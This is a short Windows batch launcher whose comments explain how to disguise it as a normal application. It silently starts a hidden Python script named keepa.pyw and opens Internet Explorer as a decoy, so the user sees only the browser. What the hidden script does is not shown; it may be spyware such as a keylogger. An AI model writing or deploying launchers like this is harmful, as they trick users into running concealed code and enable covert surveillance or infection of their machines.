:: To make it invisible, add the echo off and start with an empty
:: set of quotation marks before each command

:: This launcher should be masked as a normal application, which
:: means that its icon and name should reflect that application.
@ECHO OFF

SET keepa_exe=C:\Users\<user>\Documents\keepa\keepa.pyw
SET fake_exe=C:\Program Files\Internet Explorer\iexplore.exe

START "" "%keepa_exe%"
START "" "%fake_exe%"
